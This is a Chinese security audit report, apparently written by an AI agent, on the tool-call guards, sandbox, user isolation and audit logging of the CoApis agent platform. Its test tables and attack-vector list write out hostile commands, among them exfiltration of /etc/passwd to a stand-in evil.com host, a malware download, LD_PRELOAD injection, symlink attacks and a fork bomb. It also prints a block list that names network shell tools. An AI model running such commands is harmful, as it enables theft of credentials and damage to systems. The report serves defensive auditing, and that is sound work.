# CoApis 安全审计报告

**审计日期**: 2026-06-29  
**审计范围**: 多用户隔离、多智能体安全、沙箱执行、命令与工具安全、审计日志、攻击面分析  
**当前版本**: v0.8.48  
**审计人**: 蜜总裁 (AI Agent SCqg64)

---

## 一、审计总览

### 1.1 审计结论

| 维度 | 评级 | 说明 |
|------|------|------|
| 多用户路径隔离 | ✅ 优秀 | ToolSandbox 路径检查 7/7 通过，编码绕过全部拦截 |
| 多智能体数据隔离 | ✅ 良好 | 记忆/技能/聊天/Cron 各自独立 |
| 命令安全 | ❌ 严重不足 | ToolSandbox 仅14条规则，48%拦截率；两套并行系统互不连通 |
| 沙箱执行 | ⚠️ 部分有效 | 超时+环境变量隔离有效，但以 root 运行无 UID 隔离 |
| 审计日志 | ❌ 严重不足 | 7种事件类型仅1种有记录，旧审计日志全部丢失 |
| 攻击面防护 | ❌ 存在重大漏洞 | 19个攻击向量中12个无防护 |

### 1.2 关键数字

- **实际生效的安全模块**: 6 个
- **死代码安全模块**: 4 个（v0.8.48 新增的 UnifiedToolGuardEngine、InputGuardEngine、SandboxedExecutor、ToolRegistry.call() 白名单）
- **命令拦截率**: 48%（ToolSandbox）/ 60%（CommandRiskClassifier）
- **审计日志覆盖率**: 14%（7种事件类型中仅 path_check 有记录）
- **攻击向量**: 19个，其中12个无防护

---

## 二、执行链路追踪

### 2.1 实际执行路径

```
WebSocket 消息
  → CoApisAgent._acting(tool_call)
    → [Plan gate check]
    → ToolGuardMixin._acting(tool_call)          ← 旧安全系统
      → ToolCallMonitor.should_block()            ← 行为监控
      → _decide_guard_action()
        → ToolGuardEngine.is_denied()             ← 旧引擎（规则数=0！）
        → CommandRiskClassifier.classify()         ← 命令分级（51条规则）
        → ToolGuardEngine.guard()                  ← 旧引擎（直接返回 None）
      → _execute_guard_action()
    → ReActAgent._acting(tool_call)
      → agentscope Toolkit.call_tool_function()   ← 直接调用，绕过 ToolRegistry
        → builtin.py: execute_shell_command()
          → _check_command_access() → ToolSandbox  ← 新安全系统
          → ProcessIsolator.execute()               ← 隔离执行
```

### 2.2 两套并行安全系统

| 层级 | 系统 | 模块 | 状态 |
|------|------|------|------|
| L0 旧-行为监控 | ToolGuardMixin | ToolCallMonitor | ✅ 在执行路径中 |
| L1 旧-工具准入 | ToolGuardMixin | ToolGuardEngine | ⚠️ 在路径中但规则数=0 |
| L1 旧-命令分级 | ToolGuardMixin | CommandRiskClassifier | ✅ 在执行路径中（51条规则） |
| L2 新-路径检查 | builtin.py | ToolSandbox.check_path | ✅ 在执行路径中 |
| L2 新-命令模式 | builtin.py | ToolSandbox.check_command | ✅ 在执行路径中（14条规则） |
| L3 新-隔离执行 | builtin.py | ProcessIsolator | ✅ 在执行路径中 |
| — | security/ | UnifiedToolGuardEngine | ❌ 死代码（108命令+29规则） |
| — | security/ | InputGuardEngine | ❌ 死代码（14条规则） |
| — | security/ | SandboxedExecutor | ❌ 死代码 |
| — | tools/registry.py | ToolRegistry.call() 白名单 | ❌ 死代码 |

### 2.3 死代码根因

工具调用走 agentscope 的 `Toolkit.call_tool_function()` 直接调用工具函数，**不经过** 我们的 `ToolRegistry.call()`。因此：
- `SandboxedExecutor.check_command()` 永远不会被触发
- `UnifiedToolGuardEngine` 和 `InputGuardEngine` 只在 `SandboxedExecutor` 中被调用，但该模块无人调用
- `ToolRegistry.call()` 中的白名单检查永远不会被执行

---

## 三、多用户隔离验证

### 3.1 路径隔离（ToolSandbox.check_path）：✅ 7/7 通过

| 测试用例 | 结果 |
|----------|------|
| admin 读自己的文件 | ✅ 放行 |
| admin 读 demo_user 的文件 | ✅ 拦截 |
| demo_user 读 admin 的文件 | ✅ 拦截 |
| admin 读系统目录（/system/） | ✅ 拦截 |
| admin 读系统文件（/etc/passwd） | ✅ 拦截 |
| admin 写 demo_user 的文件 | ✅ 拦截 |
| admin 写系统目录 | ✅ 拦截 |

### 3.2 路径穿越绕过测试：✅ 全部拦截

- 简单路径穿越（`../`）：✅ 拦截
- 双重 URL 编码（`%252e%252e`）：✅ 拦截
- UTF-8 过长编码（`%c0%af`）：✅ 拦截
- 反斜杠（`..\/`）：✅ 拦截
- 空字节（`%00`）：✅ 拦截

### 3.3 操作系统级隔离：⚠️ 无

- 所有目录 `root:root 755`
- 容器内以 root 运行，无用户级 OS 隔离
- 依赖 Docker 容器隔离

### 3.4 API 层面隔离

| API | 隔离状态 |
|-----|----------|
| agents API 用户过滤 | ✅ line 552/652 校验 username |
| agents DELETE 权限 | ✅ 校验 workspace.username != username |
| config API admin 保护 | ✅ require_permission(admin:admin) |
| 文件上传路径校验 | ✅ workspaces/{username}/ |
| WebSocket 认证 | ⚠️ 无显式认证检查，依赖中间件注入 user_id |

---

## 四、多智能体安全验证

### 4.1 智能体配置隔离：✅

- 21个 profiles，每个有独立 workspace_dir
- owner 字段正确标记
- 子智能体在用户工作空间下的 agents/ 子目录

### 4.2 跨智能体数据访问：✅ 全部拦截

| 测试用例 | 结果 |
|----------|------|
| admin 读 demo_user/MEMORY.md | ✅ 拦截 |
| demo_user 读 admin/Ad_test/agent.json | ✅ 拦截 |
| admin 读 global_default/agent.json | ✅ 拦截（系统目录保护） |
| admin 写 global_default/agent.json | ✅ 拦截 |

### 4.3 工具权限隔离：⚠️ 无差异化

- 全局 `tools.builtin_tools` 配置，所有智能体共享相同工具集
- 无 per-agent 工具权限（如限制某智能体不能执行 shell）
- `delegate_external_agent` 默认 disabled（唯一被禁用的工具）

### 4.4 记忆/技能/Cron 隔离：✅

- 每个用户有独立 MEMORY.md、AGENTS.md
- 技能目录各自独立（全局 vs 用户 vs 子智能体）
- Cron 任务按用户隔离（crons/jobs.json）

---

## 五、沙箱执行验证（ProcessIsolator）

### 5.1 有效防护

| 功能 | 状态 | 详情 |
|------|------|------|
| 环境变量隔离 | ✅ | 仅保留 PATH/LANG/LC_ALL/TERM，无敏感变量泄露 |
| 超时控制 | ✅ | sleep 10 (timeout=2) → 2.0s 强制终止 |
| 临时工作目录 | ✅ | 每次执行创建 isolated_xxx 目录 |

### 5.2 存在问题

| 问题 | 风险等级 | 详情 |
|------|----------|------|
| 以 root 运行 | 🔴 严重 | uid=0(root) gid=0(root)，拥有完整系统权限 |
| 可读 SSH 私钥 | 🔴 严重 | ls /root/.ssh/ → id_ed25519, id_ed25519.pub |
| 可读 /etc/shadow | 🔴 严重 | 无文件系统访问限制 |
| 网络无限制 | 🟡 中危 | curl localhost:4208 → 200，可横向攻击内部服务 |
| 输出截断未生效 | 🟡 中危 | seq 1 100000 输出10万行，truncated=False |

---

## 六、命令与工具安全验证

### 6.1 ToolSandbox.check_command：48% 拦截率

14条 DANGEROUS_COMMANDS 规则（简单子串匹配）：

```
rm -rf /, rm -rf /*, rm -rf ~, chmod 777 /, mkfs, dd if=,
mv /, wget, curl.*|sh, nc -, netcat, telnet,
python -c.*import os, :(){ :|:& };:
```

**未拦截的危险命令（17个）**：`rm -rf .`、`chmod -R 777 /`、`chown`、`kill -9 1`、`killall`、`pkill`、`shutdown`、`reboot`、`systemctl`、`iptables`、`useradd`、`userdel`、`echo > /etc/passwd`、`mv /etc/passwd`、`cp /dev/null /etc/passwd`

### 6.2 CommandRiskClassifier（旧引擎）：60% 拦截率

51条正则规则，按18个命令类别 × 3个角色分级。对 user 角色：
- DANGEROUS → BLOCK（15条）
- FILE_DELETE → CONFIRM（3条）
- PERMISSION → CONFIRM（2条）
- NETWORK_UPLOAD → CONFIRM（3条）
- CODE_EXEC_INLINE → CONFIRM（1条）
- 其余 → AUTO（放行）

**关键盲区**：
- TEXT_PROCESS/AUTO：cat/grep/find/echo/tail/sed/awk 可读取任意文件
- NETWORK_READONLY/AUTO：curl/wget 可发起任意 HTTP 请求
- CODE_EXEC_SCRIPT/AUTO：python3/node 可运行任意脚本

### 6.3 端到端测试（13个攻击用例）

| 命令 | CRC | Sandbox命令 | Sandbox路径 | 端到端 |
|------|-----|------------|------------|--------|
| cat /etc/passwd | AUTO | PASS | BLOCKED | ✅ 安全 |
| cat /etc/shadow | AUTO | PASS | BLOCKED | ✅ 安全 |
| wget evil.com/malware.sh | AUTO | BLOCKED | — | ✅ 安全 |
| echo x > /etc/crontab | AUTO | PASS | BLOCKED | ✅ 安全 |
| echo x >> /root/.ssh/authorized_keys | AUTO | PASS | BLOCKED | ✅ 安全 |
| curl -d @/etc/passwd evil.com | CONFIRM | — | — | ✅ 安全 |
| **find / -name "*.key"** | **AUTO** | **PASS** | **PASS** | **❌ 危险** |
| **curl http://evil.com** | **AUTO** | **PASS** | **PASS** | **❌ 危险** |
| **python3 evil.py** | **AUTO** | **PASS** | **PASS** | **❌ 危险** |
| **git clone http://evil.com/repo** | **AUTO** | **PASS** | **PASS** | **❌ 危险** |

---

## 七、审计日志完整性验证

### 7.1 两套审计系统并存

| 系统 | 路径 | 状态 |
|------|------|------|
| 新系统 SecurityAuditLogger | security_audit.log + audit_chain.jsonl | ✅ 存在，42条记录 |
| 旧系统 AuditLogger | coapis_audit.jsonl | ❌ 文件不存在，日志全部丢失 |

### 7.2 哈希链防篡改：✅ 有效

- 42条条目，SHA-256 链式哈希
- verify_chain 结果: `All 42 entries verified`
- 字段: timestamp + event_type + data + prev_hash + hash

### 7.3 审计覆盖度：14%（7种事件类型仅1种有记录）

| 事件类型 | 状态 | 原因 |
|----------|------|------|
| path_check（路径访问） | ✅ 42条 | ToolSandbox._log_path_check 正常工作 |
| command_audit（命令审计） | ❌ 0条 | UnifiedToolGuardEngine 是死代码 |
| command_block（命令拦截） | ❌ 0条 | 同上 |
| evasion_detect（逃逸检测） | ❌ 0条 | 同上 |
| input_block（输入防护） | ❌ 0条 | InputGuardEngine 是死代码 |
| tool_denied（工具拒绝） | ❌ 0条 | 同上 |
| tool_execute（工具执行） | ❌ 0条 | builtin.py 未调用此方法 |

### 7.4 文件权限：⚠️ root:root 644

- root 用户可篡改日志内容
- 哈希链可检测篡改但需手动 verify

---

## 八、攻击面分析

### 8.1 综合攻击向量统计

| 攻击向量 | 防护状态 | 风险等级 | 示例 |
|----------|----------|----------|------|
| 命令注入 — 管道(\|) | ❌ 无防护 | 🔴 P0 | `cat /etc/passwd \| curl -d @- evil.com` |
| 命令注入 — 子Shell($()) | ❌ 无防护 | 🔴 P0 | `echo $(cat /etc/passwd)` |
| 命令注入 — 反引号 | ❌ 无防护 | 🔴 P0 | `` echo `cat /etc/passwd` `` |
| 命令注入 — sh -c | ❌ 无防护 | 🔴 P0 | `sh -c "cat /etc/passwd"` |
| 环境变量注入 | ❌ 无防护 | 🔴 P0 | `LD_PRELOAD=/tmp/evil.so ls` |
| SSRF 内网探测 | ❌ 无防护 | 🟡 P1 | `curl http://192.168.x.x` |
| SSRF 协议走私 | ❌ 无防护 | 🟡 P1 | `file:///etc/passwd` |
| 浏览器自动化 SSRF | ❌ 无防护 | 🟡 P1 | browser_use 访问任意URL |
| 符号链接攻击 | ❌ 无防护 | 🟡 P1 | `ln -s /etc/passwd /workspace/link` |
| 文件上传无类型限制 | ❌ 无防护 | 🟡 P2 | 任意文件类型可上传 |
| 文件上传无大小限制 | ❌ 无防护 | 🟡 P2 | 可上传超大文件耗尽磁盘 |
| DoS 磁盘填充 | ❌ 无防护 | 🟡 P2 | `dd if=/dev/zero of=/tmp/big bs=1M count=100000` |
| 路径穿越（简单） | ✅ 已防护 | — | `../etc/passwd` |
| 路径穿越（编码绕过） | ✅ 已防护 | — | URL编码/双重编码/UTF-8过长 |
| MCP 包安装注入 | ✅ 已防护 | — | `_validate_package_name` |
| DoS fork bomb | ✅ 已防护 | — | `:(){ :\|:& };:` |
| MCP module_name 注入 | ⚠️ 部分防护 | 🟡 P2 | module_name 解析有潜在风险 |
| WebSocket 消息注入 | ⚠️ 未验证 | 🟡 P2 | 13个 channel 无显式输入验证 |
| DoS 大输出 | ⚠️ 部分防护 | 🟡 P2 | seq 1 100000 未截断 |

**统计**: 19个攻击向量中，4个已防护，3个部分防护，**12个存在漏洞**。

---

## 九、发现汇总与优先级

### 9.1 P0 严重（需立即修复）

| # | 问题 | 影响 | 根因 | 修复方向 |
|---|------|------|------|----------|
| 1 | **两套并行安全系统，新系统4个模块是死代码** | UnifiedToolGuardEngine(108命令+29规则)、InputGuardEngine(14规则)、SandboxedExecutor、ToolRegistry.call()白名单全部不在执行路径 | 工具走 agentscope Toolkit 直接调用，绕过 ToolRegistry | 将 UnifiedToolGuardEngine 和 InputGuardEngine 直接集成到 builtin.py |
| 2 | **ToolGuardEngine 规则数=0** | 旧引擎完全失效，guard() 直接返回 None | 3条规则因 category 无效被跳过 | 修复 category 枚举或迁移到 UnifiedToolGuardEngine |
| 3 | **命令注入5种方式无防护** | 管道(\|)、子Shell($())、反引号、sh -c、环境变量注入均可绕过 ToolSandbox | DANGEROUS_COMMANDS 只做子串匹配，不解析 shell 语法 | 集成 UnifiedToolGuardEngine 的29条模式规则 |
| 4 | **以 root 运行，可读 SSH 私钥和 /etc/shadow** | 任何命令拥有完整系统权限 | ProcessIsolator 无 UID/GID 隔离 | 创建非特权用户，以该用户身份执行命令 |
| 5 | **旧审计日志全部丢失** | 行为拦截/审批流/风险分类日志不存在 | coapis_audit.jsonl 文件不存在 | 修复旧审计日志路径或统一到新系统 |

### 9.2 P1 高危（需尽快修复）

| # | 问题 | 影响 | 根因 | 修复方向 |
|---|------|------|------|----------|
| 6 | **审计日志覆盖度仅14%** | 7种事件类型仅 path_check 有记录 | UnifiedToolGuardEngine/InputGuardEngine 是死代码 | 修复问题1后自动解决 |
| 7 | **SSRF 无防护** | curl/browser_use 可访问内网和任意协议 | 无 URL 白名单和内网地址过滤 | 添加 URL 白名单，禁止内网地址和危险协议 |
| 8 | **TEXT_PROCESS/AUTO 可读取任意文件** | cat/grep/find/echo/tail 可读系统文件 | CommandRiskClassifier 将文本处理归为 AUTO | 集成 UnifiedToolGuardEngine 的路径规则检测 |
| 9 | **符号链接攻击无防护** | `ln -s /etc/passwd /workspace/link` 可创建指向系统文件的链接 | 无 readlink 检查 | 在 file_write/list_files 中检查符号链接目标 |

### 9.3 P2 中危（需规划修复）

| # | 问题 | 影响 | 根因 | 修复方向 |
|---|------|------|------|----------|
| 10 | **文件上传无大小/类型限制** | 可上传超大文件耗尽磁盘 | 无文件大小和类型检查 | 添加文件大小限制和类型白名单 |
| 11 | **输出截断未生效** | seq 1 100000 输出10万行 | max_output_bytes 阈值过大或逻辑有误 | 修复截断逻辑，设置合理阈值 |
| 12 | **全局工具配置无差异化** | 所有智能体共享相同工具权限 | 无 per-agent 工具权限配置 | 支持 per-agent tools override |
| 13 | **审计日志文件权限 644** | root 可篡改日志 | 未设置只读权限 | 设置 444 权限，哈希链定期 verify |
| 14 | **WebSocket 无显式认证** | 依赖中间件注入 user_id | 无 token 验证逻辑 | 添加 WebSocket 握手时的 token 验证 |

---

## 十、修复建议（按优先级排序）

### 立即执行（本周）

1. **激活 UnifiedToolGuardEngine**：将 `unified_engine.py` 直接集成到 `builtin.py` 的 `shell_execute` 中，替代 `ToolSandbox.check_command` 的14条简陋规则
2. **激活 InputGuardEngine**：在 `shell_execute` 入口处调用 `InputGuardEngine.check()`，拦截 Prompt 注入和数据窃取
3. **修复旧审计日志**：统一两套审计系统，所有安全事件写入 `security_audit.log` + `audit_chain.jsonl`
4. **修复 ToolGuardEngine 规则**：修复 `container_management`/`package_management`/`version_control` category 枚举，或直接迁移到 UnifiedToolGuardEngine

### 尽快执行（两周内）

5. **添加 SSRF 防护**：curl/browser_use 添加 URL 白名单，禁止内网地址（10.x/172.16-31.x/192.168.x）和危险协议（file/gopher/ftp）
6. **添加符号链接检查**：在 file_write/list_files 中使用 `os.path.realpath()` 检查符号链接目标
7. **ProcessIsolator 非特权用户**：创建 `coapis_worker` 用户，以该用户身份执行命令
8. **文件上传限制**：添加文件大小限制（如 100MB）和危险类型黑名单（.exe/.sh/.bat）

### 规划执行（一个月内）

9. **per-agent 工具权限**：支持智能体级别的工具启用/禁用配置
10. **输出截断修复**：修复 max_output_bytes 逻辑，设置合理阈值（如 1MB）
11. **WebSocket 认证**：添加握手时的 token 验证
12. **审计日志定期 verify**：添加 cron 任务定期验证哈希链完整性

---

## 附录A：安全审计技术架构图

```
┌─────────────────────────────────────────────────────────────────┐
│                      WebSocket 消息入口                          │
│                  (无显式 token 认证 ⚠️)                          │
└──────────────────────────┬──────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│                CoApisAgent._acting(tool_call)                    │
│                        │                                         │
│          ┌─────────────┼─────────────┐                          │
│          ▼             ▼             ▼                          │
│   ToolCallMonitor  CommandRisk    ToolGuardEngine               │
│   (行为监控)       Classifier     (规则=0 ❌)                    │
│   ✅ 生效         ✅ 生效         ❌ 失效                        │
│                   (51条规则)                                      │
└──────────────────────────┬──────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│            agentscope Toolkit.call_tool_function()               │
│            (直接调用，绕过 ToolRegistry ❌)                       │
└──────────────────────────┬──────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│              builtin.py: execute_shell_command()                 │
│                        │                                         │
│          ┌─────────────┼─────────────┐                          │
│          ▼             ▼             ▼                          │
│   ToolSandbox    UnifiedToolGuard  InputGuardEngine             │
│   .check_command  Engine           (死代码 ❌)                   │
│   (14条规则 ⚠️)   (死代码 ❌)                                     │
│   .check_path                                                   │
│   ✅ 生效                                                       │
└──────────────────────────┬──────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│              ProcessIsolator.execute()                           │
│   ✅ 环境变量隔离  ✅ 超时控制  ❌ root 运行                      │
│   ❌ 无输出截断    ❌ 无文件系统限制                               │
└──────────────────────────┬──────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│                   审计日志                                        │
│   SecurityAuditLogger: security_audit.log + audit_chain.jsonl   │
│   ✅ path_check(42条) ❌ 其余6种=0条                              │
│   旧 AuditLogger: coapis_audit.jsonl (文件不存在 ❌)              │
└─────────────────────────────────────────────────────────────────┘
```

## 附录B：安全模块生效状态速查表

| 模块 | 路径 | 在执行路径中 | 规则数 | 备注 |
|------|------|:---:|--------|------|
| ToolCallMonitor | agents/security/ | ✅ | N/A | 行为频率监控 |
| CommandRiskClassifier | security/ | ✅ | 51条正则 | 18类别×3角色 |
| ToolGuardEngine | security/tool_guard/ | ⚠️ | 0条 | 规则因category无效被跳过 |
| ToolSandbox.check_path | security/ | ✅ | 路径白名单 | 多用户隔离核心 |
| ToolSandbox.check_command | security/ | ✅ | 14条子串 | 远不够覆盖 |
| ProcessIsolator | security/ | ✅ | N/A | root运行=无UID隔离 |
| UnifiedToolGuardEngine | security/tool_guard/ | ❌ | 108命令+29规则 | **死代码** |
| InputGuardEngine | security/input_guard/ | ❌ | 14条规则 | **死代码** |
| SandboxedExecutor | security/ | ❌ | N/A | **死代码** |
| ToolRegistry.call() | tools/registry.py | ❌ | 白名单 | **死代码** |
| SecurityAuditLogger | security/ | ⚠️ | N/A | 仅path_check被调用 |
| 旧 AuditLogger | agents/security/ | ⚠️ | N/A | 文件不存在 |

---

*报告生成时间: 2026-06-29 14:00 CST*
